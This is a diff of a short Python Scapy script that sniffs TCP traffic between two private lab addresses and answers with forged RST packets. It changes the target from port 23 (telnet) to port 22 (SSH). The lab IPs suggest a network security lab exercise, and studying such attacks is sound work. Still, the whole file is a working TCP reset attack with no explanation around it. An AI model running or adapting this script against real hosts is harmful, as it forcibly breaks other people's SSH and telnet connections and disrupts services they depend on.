@@ -2,14 +2,16 @@
 import sys
 from scapy.all import *
 
+targetPort=22
+
 def spoof(pkt):
 	o_tcp = pkt[TCP]
 	
 	ip = IP( src="10.0.2.7", dst="10.0.2.6" )
-	tcp = TCP( sport=23, dport=o_tcp.sport, flags="R", seq=o_tcp.ack)
+	tcp = TCP( sport=targetPort, dport=o_tcp.sport, flags="R", seq=o_tcp.ack)
 	pkt = ip/tcp
 	ls(pkt)
 	send(pkt, verbose=0) 		
 
-myFilter = 'tcp and src host 10.0.2.6 and dst host 10.0.2.7' + ' and dst port 23 '
+myFilter = 'tcp and src host 10.0.2.6 and dst host 10.0.2.7' + ' and dst port '+str(targetPort)
 sniff(filter=myFilter, prn=spoof)
